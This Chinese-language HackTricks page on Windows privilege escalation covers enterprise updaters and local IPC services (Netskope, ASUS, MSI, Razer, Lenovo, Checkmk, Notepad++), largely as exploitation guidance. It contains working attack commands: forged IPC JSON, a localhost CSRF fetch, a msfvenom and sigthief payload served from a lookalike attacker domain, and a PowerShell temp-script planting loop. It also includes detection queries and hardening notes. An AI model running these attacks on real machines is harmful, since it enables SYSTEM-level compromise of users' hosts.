# 滥用企业自动更新程序和特权 IPC（例如 Netskope、ASUS 和 MSI）

{{#include ../../banners/hacktricks-training.md}}

本页概述了一类 Windows 本地权限提升攻击链，常见于企业终端代理和更新程序：它们暴露了低门槛 IPC 接口，并提供特权更新流程。一个典型案例是 Netskope Client for Windows < R129（CVE-2025-0309）：低权限用户可以诱使客户端向攻击者控制的服务器注册，然后让其投递恶意 MSI，由 SYSTEM 服务安装。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

可复用于类似产品的关键思路：
- 滥用特权服务的 localhost IPC，迫使其重新注册或重新配置到攻击者的服务器。
- 实现厂商的更新端点，投递恶意 Trusted Root CA，并让更新程序指向恶意的“已签名”软件包。
- 绕过薄弱的签名者检查（CN allow-lists）、可选的摘要标志，以及宽松的 MSI 属性检查。
- 如果 IPC 使用了“加密”，可从注册表中全局可读的机器标识符推导密钥/IV。
- 如果服务根据映像路径/进程名限制调用方，可注入 allow-list 中的进程；或者以挂起状态启动该进程，再通过最小化的线程上下文补丁加载 DLL。

即使自定义本地 TCP 服务要求提供 PIN 或其他应用凭据，也应对其身份验证和输入边界进行同等审查。确定监听端口对应的进程及其有效服务账户，然后检查实际部署的二进制文件/版本，并确认在将调用方可控字段复制到固定缓冲区或用于构造子进程命令前，是否进行了长度检查。[Microsoft's buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) 说明了为何未经检查的外部输入在特权原生代码中很危险。仅凭 loopback 监听器、硬编码凭据或进程名，不能证明存在内存破坏或可执行 SYSTEM 权限操作；可达性、授权、代码路径和缓解措施仍是彼此独立的条件。常规枚举应保持被动，不要向运行中的服务发送超长输入来触发崩溃。

---
## 1) 通过 localhost IPC 迫使客户端向攻击者服务器注册

许多代理都带有用户态 UI 进程，该进程通过 localhost TCP 和 JSON 与 SYSTEM 服务通信。

在 Netskope 中观察到：
- UI：stAgentUI（低完整性）↔ 服务：stAgentSvc（SYSTEM）
- IPC 命令 ID 148：IDP_USER_PROVISIONING_WITH_TOKEN

攻击流程：
1) 构造一个 JWT 注册令牌，其声明可控制后端主机（例如 AddonUrl）。使用 alg=None，这样就不需要签名。
2) 发送调用注册命令的 IPC 消息，并附上 JWT 和租户名称：

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) 服务开始向你的恶意服务器请求 enrollment/config，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意：
- 如果调用方验证基于路径/名称，则应通过 allow-listed vendor binary 发起请求（见 §4）。<sup>[[1]](#references)[[2]](#references)</sup>

### 暴露于网络的管理 IPC

此信任边界并不总是局限于 localhost。在报告的 MyReport Updater 2.1.1 案例中，一个 `LocalSystem` 服务监听所有接口，并接受未经身份验证的 gRPC 配置更改，可修改 reference host、端口和运行模式。远程攻击变体既需要能够访问该监听器，也需要服务能够向所选 reference 发起出站连接。应分别评估这些条件，以及后续 package 流程能否跨越文件写入边界。<sup>[[16]](#references)</sup>

---
## 2) 劫持更新通道，以 SYSTEM 身份运行代码

客户端开始与你的服务器通信后，实现其预期的 endpoints，并引导它获取攻击者的 MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON 配置，将 updater 间隔设得很短，例如：
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → 返回 PEM CA 证书。该服务会将其安装到 Local Machine Trusted Root 存储区。
3) /v2/checkupdate → 提供指向恶意 MSI 和伪造版本的元数据。

绕过实际环境中常见检查的方法：
- Signer CN allow-list：服务可能只检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的 rogue CA 可以签发带有该 CN 的 leaf，并为 MSI 签名。
- CERT_DIGEST property：包含一个名为 CERT_DIGEST 的无害 MSI property。安装时不会强制验证。
- Optional digest enforcement：配置标志（例如 check_msi_digest=false）会禁用额外的加密验证。

结果：SYSTEM 服务会从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，并以 NT AUTHORITY\SYSTEM 身份执行任意代码。<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass 经验：如果供应商的应对方式是将少数“受信任”域名加入 allow-list，而不是通过加密方式认证更新来源，就要检查供应商拥有的 redirector 或 reverse proxy 是否仍允许你控制流量。在 Netskope 的案例中，后续公开研究表明，R129 时代的 allow-list 仍可通过 `rproxy.goskope.com` 滥用；该服务会代理攻击者控制的 Azure App Service 内容。应将 hostname allow-list 视为一道障碍，而不是信任边界。<sup>[[14]](#references)</sup>

另一种失效模式是**自洽但未经认证的 package metadata**。在 MyReport 案例中，攻击者控制的引用提供了修改后的 archive，而中间人则在供应商的 MD5 digest 和 size 响应到达 updater 之前对其进行了修改。匹配这些值验证的是响应之间的一致性，而非供应商来源；无需进行 MD5 collision。随后，由调用者选择的安装目录使特权解压操作成为文件写入边界。由此产生的 DLL-loading primitive 详见 [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack)。<sup>[[16]](#references)</sup>

---
## 3) 伪造加密的 IPC 请求（如果存在）

从 R127 开始，Netskope 会将 IPC JSON 封装在一个看起来像 Base64 的 encryptData 字段中。逆向分析发现，它使用 AES，key/IV 由任何用户都可读取的注册表值派生：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以复现加密过程，并以普通用户身份发送有效的加密命令。<sup>[[1]](#references)[[2]](#references)</sup> 一般建议：如果某个 agent 突然开始对 IPC 进行“加密”，就检查 HKLM 下的 device ID、product GUID、install ID 等值是否被用作材料。

---
## 4) 绕过 IPC 调用方 allow-list（路径/名称检查）

一些服务会尝试通过解析 TCP 连接的 PID，并将映像路径/名称与位于 Program Files 下的供应商二进制文件 allow-list 进行比较，从而验证对端身份（例如 stagentui.exe、bwansvc.exe、epdlp.exe）。

两种实用的 bypass 方法：
- 将 DLL injection 到 allow-list 中的进程（例如 nsdiag.exe），并在其中代理 IPC。
- 以挂起状态启动 allow-list 中的二进制文件，并在不使用 CreateRemoteThread 的情况下启动你的 proxy DLL（参见 §5），以满足 driver 强制执行的防篡改规则。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) 兼容防篡改保护的 injection：挂起进程 + NtContinue 补丁

产品通常会随附一个 minifilter/OB callbacks driver（例如 Stadrv），用于从指向受保护进程的 handles 中移除危险权限：
- Process：移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread：限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一种遵守这些限制的可靠 user-mode loader：
1) 使用 CREATE_SUSPENDED 创建供应商二进制文件的进程。
2) 获取仍被允许的 handles：进程的 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，以及带有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 的 thread handle（如果在已知 RIP 处修补代码，也可以只使用 THREAD_RESUME）。
3) 将 ntdll!NtContinue（或其他较早执行且保证已映射的 thunk）覆盖为一个微型 stub；该 stub 会调用 LoadLibraryW 加载你的 DLL 路径，然后跳回。
4) 调用 ResumeThread，在进程内部触发 stub，从而加载你的 DLL。

由于你没有对已受保护的进程使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（该进程由你创建），因此符合 driver 的策略。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 实用工具
- NachoVPN（Netskope plugin）可自动创建 rogue CA、为恶意 MSI 签名，并提供所需 endpoints：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。<sup>[[3]](#references)</sup>
- UpSkope 是一个自定义 IPC client，可构造任意（可选 AES 加密的）IPC 消息，并包含挂起进程 injection 功能，以便从 allow-list 中的二进制文件发起请求。<sup>[[4]](#references)</sup>

## 7) 针对未知 updater/IPC 接口的快速初步排查流程

面对新的 endpoint agent 或主板“helper”套件时，通常只需快速排查一下，就能判断它是否是一个值得关注的 privesc 目标：<sup>[[6]](#references)</sup>

1) 枚举 loopback listeners，并将其映射回供应商进程：

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 枚举候选命名管道：

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) 挖掘基于插件的 IPC 服务器使用的注册表路由数据：

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) 首先从用户态客户端中提取 endpoint 名称、JSON 键和 command ID。打包的 Electron/.NET 前端经常会 leak 完整的 schema：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 查找实际的信任判断条件，而不只是最终启动进程的代码路径：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

值得优先关注的模式：
- 如果发现使用 `CryptQueryObject`/证书解析，却没有调用 `WinVerifyTrust`，通常意味着程序把“证书存在”当成了“证书可信”，从而可能导致证书克隆或其他伪造签名者的技巧。
- 对 `Origin`、`Referer`、下载 URL、进程名或签名者 CN 执行子串/后缀检查，并不能构成身份验证。`contains(".vendor.com")` 通常可被攻击者控制的仿冒域名利用。
- 如果低权限 GUI 负责判定“文件可信”，而 SYSTEM broker 只使用这个结果，那么修补或重新实现客户端 DLL/JS 往往就能完全绕过这道边界（Razer 风格的分离验证）。
- 如果 broker 将 payload 复制到 `%TEMP%`/`C:\Windows\Temp`，然后再从该路径验证或安排执行，应立即测试 TOCTOU 替换窗口，并检查是否存在提供较弱检查的同级插件模块，暴露了其他 `ExecuteTask()` 封装。<sup>[[6]](#references)</sup>

对于大量使用 named pipe 的目标，PipeViewer 可以快速发现较弱的 DACL 和可远程访问的管道，让你在深入逆向协议前先锁定目标。<sup>[[11]](#references)</sup>

如果目标仅通过 PID、映像路径或进程名对调用方进行身份验证，就应将其视为障碍，而非安全边界：注入合法客户端，或从允许列表中的进程发起连接，通常就足以通过服务器的检查。对于 named pipe，关于客户端模拟和管道滥用的[此页面](named-pipe-client-impersonation.md)更深入地介绍了这一原语。

对于特权 **清理或还原 broker**，除了检查管道 ACL，也要检查路径信任边界。即使服务可执行文件及其安装目录受到保护，低权限调用方仍可能选择还原目标位置，或在共享目录中重命名暂存的备份文件。应分别确认调用方能否访问还原命令、能否修改确切的暂存输入或文件名、broker 是否以更高权限身份运行，以及其还原操作是否确实会写入所选的受保护路径。暂存目录可写或管道可读，单独来看并不能证明存在任意特权写入；需要通过代码审查或受控测试确认目标路径映射和服务行为。被动枚举时不要调用未知的清理命令，因为它可能会删除用户文件。

---
## 8) 仅通过供应商签名进行身份验证的模块化 add-in broker（Lenovo Vantage 模式）

一种值得关注的新变体是**signed-client RPC broker**：低权限的 Lenovo 签名桌面进程与 SYSTEM 服务通信，而该服务会将 JSON 命令路由到 `%ProgramData%` 下由 XML 描述的一组 add-in。一旦在任何受信任的签名客户端**内部实现代码执行**，每个 `runas="system"` contract 都会成为你的攻击面。<sup>[[15]](#references)</sup>

Lenovo Vantage 研究中观察到的高价值原语：
- **因为调用方由供应商签名而信任它**：研究人员通过将 Lenovo 签名的 EXE 复制到可写目录，并满足 DLL 侧载（`profapi.dll`）条件，使任意代码在服务已信任的客户端中运行，从而进入经过身份验证的上下文。
- **通过 manifest 发现攻击面**：add-in 定义在 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 下；多个 contract 以 `SYSTEM` 身份运行，因此枚举这些 manifest 往往比逆向 broker 本身更快地揭示真正的特权操作。
- **经过身份验证的通道后的逐命令漏洞**：进入受信任客户端后，公开研究发现了更新/安装操作中的路径遍历与竞争条件、对特权设置数据库的原始 SQL 滥用，以及基于子串的注册表路径检查；这些问题允许向预期 hive 之外的位置写入。

目标上的实用侦察：

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

实用要点：每当某个 helper suite 暴露一个 broker，先验证**调用方进程**，再分发到数十个 plugin/add-in 命令时，不要在绕过入口信任检查后就停手。导出 manifest/contract 表，并分别 fuzz 每个高权限动词；经过身份验证的通道通常还隐藏着多个第二阶段漏洞。

---
## 1) 针对特权 HTTP API 的浏览器到 localhost CSRF（ASUS DriverHub）

DriverHub 会在 127.0.0.1:53000 上运行一个用户模式 HTTP 服务（ADU.exe），该服务要求浏览器请求来自 https://driverhub.asus.com。Origin 过滤器会对 Origin header 和 `/asus/v1.0/*` 暴露的下载 URL 执行 `string_contains(".asus.com")`。因此，像 `https://driverhub.asus.com.attacker.tld` 这样的攻击者控制主机也能通过检查，并从 JavaScript 发起会改变状态的请求。<sup>[[6]](#references)</sup> 更多绕过方式请参阅 [CSRF 基础知识](../../pentesting-web/csrf-cross-site-request-forgery.md)。

实用流程：
1) 注册一个包含 `.asus.com` 的域名，并在其上托管恶意网页。
2) 使用 `fetch` 或 XHR 调用 `http://127.0.0.1:53000` 上的特权端点（例如 `Reboot`、`UpdateApp`）。
3) 发送处理程序所需的 JSON body——打包后的前端 JS 展示了下方的 schema。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

即使将 Origin header 伪造为受信任的值，下面展示的 PowerShell CLI 也能成功：

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

任何对攻击者站点的浏览器访问，都会变成一次点击（或通过 `onload` 实现零点击）的本地 CSRF，驱动一个 SYSTEM helper。

---
## 2) 不安全的代码签名验证与证书克隆（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` 会下载 JSON 请求体中指定的任意可执行文件，并将其缓存到 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`。下载 URL 验证复用了相同的子字符串逻辑，因此 `http://updates.asus.com.attacker.tld:8000/payload.exe` 会被接受。下载后，ADU.exe 只会检查 PE 是否包含签名，以及 Subject 字符串是否与 ASUS 匹配，然后就会运行它——没有 `WinVerifyTrust`，也没有证书链验证。

要利用此流程：
1) 创建一个 payload（例如，`msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) 将 ASUS 的签名者克隆到其中（例如，`python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) 将 `pwn.exe` 托管在一个仿冒 `.asus.com` 的域名上，并通过上文的浏览器 CSRF 触发 UpdateApp。

由于 Origin 和 URL 过滤器都基于子字符串匹配，且签名者检查只比较字符串，DriverHub 会在其提升后的上下文中下载并执行攻击者的二进制文件。<sup>[[6]](#references)</sup>

---
## 1) 更新程序复制/执行路径中的 TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center 的 SYSTEM 服务公开了一个 TCP 协议，其中每个帧的格式为 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`。核心组件（Component ID `0f 27 00 00`）提供 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`。其处理程序会：
1) 将提供的可执行文件复制到 `C:\Windows\Temp\MSI Center SDK.exe`。
2) 通过 `CS_CommonAPI.EX_CA::Verify` 验证签名（证书 Subject 必须等于 “MICRO-STAR INTERNATIONAL CO., LTD.”，且 `WinVerifyTrust` 必须成功）。
3) 创建一个计划任务，以 SYSTEM 身份运行临时文件，并使用攻击者控制的参数。

在验证与 `ExecuteTask()` 之间，复制的文件没有被锁定。攻击者可以：
- 发送指向合法 MSI 签名二进制文件的 Frame A（确保签名检查通过并将任务加入队列）。
- 通过反复发送指向恶意 payload 的 Frame B 消息发起竞速，在验证完成后立即覆盖 `MSI Center SDK.exe`。

计划任务触发时，会以 SYSTEM 身份执行被覆盖的 payload，尽管最初验证的是原始文件。可靠的利用方式是使用两个 goroutine/线程持续发送 CMD_AutoUpdateSDK，直到赢得 TOCTOU 竞态窗口。<sup>[[6]](#references)</sup>

---
## 2) 滥用自定义 SYSTEM 级 IPC 与模拟（MSI Center + Acer Control Centre）

### MSI Center TCP 命令集
- `MSI.CentralServer.exe` 加载的每个插件/DLL 都会分配一个 Component ID，该 ID 存储在 `HKLM\SOFTWARE\MSI\MSI_CentralServer` 下。帧的前 4 个字节用于选择组件，因此攻击者可以将命令路由到任意模块。
- 插件可以定义自己的任务运行器。`Support\API_Support.dll` 提供 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`，并直接调用 `API_Support.EX_Task::ExecuteTask()`，**不进行任何签名验证**——任何本地用户都可以指定 `C:\Users\<user>\Desktop\payload.exe`，从而稳定地以 SYSTEM 身份执行。
- 使用 Wireshark 嗅探 loopback 流量，或在 dnSpy 中分析 .NET 二进制文件，可以快速找出 Component 与命令之间的映射；随后即可使用自定义 Go/ Python 客户端重放帧。<sup>[[6]](#references)</sup>

### Acer Control Centre 命名管道与模拟级别
- `ACCSvc.exe`（SYSTEM）公开了 `\\.\pipe\treadstone_service_LightMode`，其自主访问控制列表允许远程客户端连接（例如，`\\TARGET\pipe\treadstone_service_LightMode`）。发送带有文件路径的命令 ID `7` 会调用该服务的进程创建例程。
- 客户端库会将一个魔术终止字节（113）与参数一起序列化。使用 Frida/`TsDotNetLib` 进行动态插桩（插桩提示见 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)）可以看到，本机处理程序会在调用 `CreateProcessAsUser` 之前，将该值映射为一个 `SECURITY_IMPERSONATION_LEVEL` 和完整性 SID。
- 将 113（`0x71`）替换为 114（`0x72`），就会进入保留完整 SYSTEM token 并设置高完整性 SID（`S-1-16-12288`）的通用分支。因此，启动的二进制文件会以不受限制的 SYSTEM 身份运行，无论是在本地还是跨机器都如此。
- 将此方法与公开的安装程序标志（`Setup.exe -nocheck`）结合，即使在实验室 VM 上也能安装 ACC，并测试该管道，无需厂商硬件。<sup>[[6]](#references)</sup>

这些 IPC 漏洞凸显了 localhost 服务必须实施双向身份验证（ALPC SIDs、`ImpersonationLevel=Impersonation` 过滤器、token 过滤），也说明每个模块的“运行任意二进制文件” helper 都必须采用相同的签名验证。

---
## 3) 基于薄弱用户态验证的 COM/IPC “elevator” helper（Razer Synapse 4）

Razer Synapse 4 为这类漏洞增加了另一种有用模式：低权限用户可以请求 COM helper 通过 `RzUtility.Elevator` 启动进程，而信任判断委托给用户态 DLL（`simple_service.dll`），并未在特权边界内得到可靠执行。

观察到的利用路径：
- 实例化 COM 对象 `RzUtility.Elevator`。
- 调用 `LaunchProcessNoWait(<path>, "", 1)` 请求提升权限启动。
- 在公开的 PoC 中，会在发出请求前修补掉 `simple_service.dll` 中的 PE 签名检查，从而允许启动攻击者指定的任意可执行文件。<sup>[[6]](#references)[[10]](#references)</sup>

最简 PowerShell 调用：

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

总体结论：逆向分析“helper”套件时，不要只检查 localhost TCP 或 named pipes。检查是否存在名称类似 `Elevator`、`Launcher`、`Updater` 或 `Utility` 的 COM 类，然后确认特权服务是否确实自行验证目标二进制文件，还是仅信任由可被修改的用户模式客户端 DLL 计算出的结果。这种模式不只存在于 Razer：任何由高权限 broker 接收低权限端给出的允许/拒绝决策的拆分设计，都可能成为 privesc 攻击面。


---
## MSI 修复期间可预测的临时脚本执行（Checkmk Agent / CVE-2024-0670）

某些 Windows agent 仍会通过在 `C:\Windows\Temp` 中写入临时 `.cmd` 文件并以 `SYSTEM` 身份执行来实现特权操作。如果文件名可预测，且服务无法安全地重新创建已存在的文件，低权限用户就可以预先创建未来的临时文件并将其设为**只读**，让特权进程执行攻击者控制的内容，而不是自己的脚本。

在存在漏洞的 Checkmk Agent 版本中观察到：
- 临时文件名模式：`cmk_all_<PID>_1.cmd`
- 受影响的分支：`2.0.0`、`2.1.0`、`2.2.0`
- 触发方式：修复缓存的 agent 软件包 MSI<sup>[[8]](#references)[[9]](#references)</sup>

实际操作流程：
1. 根据当前进程 ID 或正在运行的 agent PID，估算一个合理的 PID 范围。
2. 写入简短的 **ASCII** `.cmd` payload（使用 `Set-Content -Encoding Ascii` 或 `cmd.exe` 重定向；避免使用 PowerShell 输出 UTF-16 编码的批处理文件）。
3. 在候选范围内批量创建 `C:\Windows\Temp\cmk_all_<PID>_1.cmd`，并将每个文件设为只读。
4. 触发缓存 MSI 的修复，使特权服务尝试重新生成并执行临时脚本。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

如果易受攻击的产品是通过 Windows Installer 安装的，请先将 `C:\Windows\Installer` 下名称看似随机的缓存 MSI 映射回其产品名称，再触发修复：<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

操作说明：
- 当 `msiexec /fa` 在非交互式 WinRM shell 中失败，且你需要判断现有的桌面/断开连接的会话是否能正确触发 repair 时，`qwinsta` 很有用。<sup>[[7]](#references)</sup>
- 此模式也适用于其他 endpoint agents 和 updaters：它们会**将临时脚本暂存到所有用户均可写的位置，之后再以 SYSTEM 身份执行**。检查名称是否可预测、是否缺少 exclusive create 语义，以及能否按需触发 repair/update 流程。

### 交互式 installer repair 和特权 console

PDF24 Creator 11.15.1 展示了另一种 MSI repair 风险：repair 期间，其 printer-install custom action 可能会以 SYSTEM 权限启动一个可见的 console。供应商在 11.15.2 中修改了 MSI installer，以解决这一行为。旧版产品只能作为初步排查线索。检查已注册或可访问的 MSI package、此用户能否发起 repair、易受攻击的 custom action 和 log-file 延迟是否存在，以及交互式桌面是否会显示该 console。报告中的延迟通过对 `faxPrnInst.log` 使用 oplock 实现；普通的文件可写权限并非唯一的访问条件。非交互式 shell、无法访问的 package 或已修补的 installer 都可能中断利用链。此问题不依赖 `AlwaysInstallElevated`，也不同于替换可预测的临时脚本。

---
## 通过弱 updater 验证劫持远程供应链（WinGUp / Notepad++）

2025 年 6 月至 2025 年 12 月期间，入侵 Notepad++ 更新流程背后托管基础设施的攻击者，向选定受害者定向提供恶意 manifest。较旧的、基于 WinGUp 的 updaters 未能完整验证更新真实性，因此恶意 XML 响应可以将客户端重定向到攻击者控制的 URL。由于客户端接受 HTTPS 内容时，既未强制验证受信任的证书链，也未验证下载的 installer 是否具有有效 PE signature，受害者因此下载并执行了被植入木马的 NSIS `update.exe`。<sup>[[12]](#references)[[13]](#references)</sup>

操作流程（不需要本地 exploit）：
1. **拦截基础设施**：入侵 CDN/托管服务，并在响应更新检查时返回攻击者构造的 metadata，指向恶意下载 URL。
2. **植入木马的 NSIS**：installer 获取并执行 payload，利用两条执行链：
   - **自带签名二进制文件并进行 sideload**：捆绑已签名的 Bitdefender `BluetoothService.exe`，并在其搜索路径中放置恶意 `log.dll`。运行该签名二进制文件时，Windows 会 sideload `log.dll`，由其解密并反射式加载 Chrysalis 后门（通过 Warbird 保护和 API hashing 增加静态检测难度）。
   - **脚本化 shellcode 注入**：NSIS 执行编译后的 Lua 脚本，该脚本使用 Win32 APIs（例如 `EnumWindowStationsW`）注入 shellcode 并暂存 Cobalt Strike Beacon。<sup>[[12]](#references)</sup>

适用于任何 auto-updater 的加固/检测要点：
- 强制对下载的 installer 进行**证书和 signature 验证**（固定 vendor signer，拒绝 CN/chain 不匹配的情况），并对 update manifest 本身签名（例如使用 XMLDSig）。除非经过验证，否则阻止由 manifest 控制的重定向。
- 将**自带签名二进制文件并进行 sideload**视为下载后的检测切入点：当已签名的 vendor EXE 从其标准安装路径以外加载 DLL（例如 Bitdefender 从 Temp/Downloads 加载 `log.dll`），或 updater 将非 vendor 签名的 installer 写入并从临时目录执行时发出警报。
- 监控此攻击链中观察到的**恶意软件特有 artifacts**（可用作通用检测切入点）：mutex `Global\Jdhfv_1.0.1`、`gup.exe` 异常写入 `%TEMP%`，以及 Lua 驱动的 shellcode 注入阶段。
- Notepad++ 在 v8.8.9 及后续版本中加强了 WinGUp：现在返回的 XML 会经过签名（XMLDSig），较新的版本也会强制验证下载 installer 的证书和 signature，而不再仅信任传输过程。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 签名 EXE sideloading <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> 启动非 Notepad++ 安装程序</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

这些模式适用于任何接受未签名清单或未能固定安装程序签名者的 updater：网络劫持 + 恶意安装程序 + BYO-signed sideloading，可伪装成“可信”更新来实现远程代码执行。

### 将通知配置用作第二个更新触发器

Updater 可以使用独立的远程配置来**暂存内容并触发其执行**。这需要控制这些配置或其响应；相关报告未说明攻击者如何获得源站访问权限。在 AOMEI 案例中，`down_html.ini` 用于指定 archive URL、版本（`thrid`）和 MD5（`Val`）；攻击者提高了版本号，并同时修改 URL 和匹配的 checksum。这属于上文所述的[metadata trust-boundary failure](#2-hijacking-the-update-channel-to-run-code-as-system)。额外的执行路径涉及 `Notifycfg.ini`：它指示 `ABNotify.exe` 通过 WebView 中的本地 `file:///` URL 加载已解压的 `upgrade-now.html`。该页面会自动跳转到同目录下的可执行文件，再由 WebView 交给系统 shell。子进程继承 notifier 的权限；这本身不会将其提升为 SYSTEM。<sup>[[17]](#references)[[18]](#references)</sup>

Google 还报告了一个被篡改的 `Notifycfg.ini`，其中包含超过 35,000 个重复的虚拟 section，绕过了该客户端的常规版本检查。报告并未证明这是一种通用的 parser bypass。攻击者会在五到十分钟的时间窗口后恢复远程文件，因此只有在这些窗口内轮询的客户端才会收到被修改的配置。该通知渠道还承载了一种独立的 [WebDAV/NTLM coercion lure](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion)，无需执行 archive。<sup>[[18]](#references)</sup>

---
## 通过共享内存引导进入特权服务 IPC

